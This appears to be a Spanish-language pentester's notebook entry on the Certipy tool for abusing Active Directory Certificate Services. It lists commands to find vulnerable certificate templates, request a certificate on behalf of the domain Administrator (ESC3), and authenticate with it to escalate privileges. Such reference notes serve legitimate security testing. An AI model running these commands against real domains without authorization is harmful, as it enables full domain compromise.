---
tags: [herramienta, ad, adcs, certificados]
tipo: herramienta
categoria: ad
ultima_revision: 2026-10-20
---

# Certipy

Enumeración y abuso de AD CS (ESC1-ESC8…), PKINIT y recuperación de hashes.

## Uso típico

```bash
certipy-ad find -u user@dom -p '<pw>' -dc-ip <ip> -vulnerable -stdout
certipy-ad req -u user@dom -p '<pw>' -ca <CA> -template <T>
certipy-ad req -u user@dom -p '<pw>' -ca <CA> -template User -on-behalf-of 'DOM\Administrador' -pfx agente.pfx -out admin
certipy-ad auth -pfx admin.pfx -dc-ip <ip>
```

## Notas / lecciones

- ESC3 = EKU *Certificate Request Agent* + enrollment rights.

## Técnicas relacionadas

- [[ADCS-ESC3]], [[PKINIT-Pass-The-Hash]]
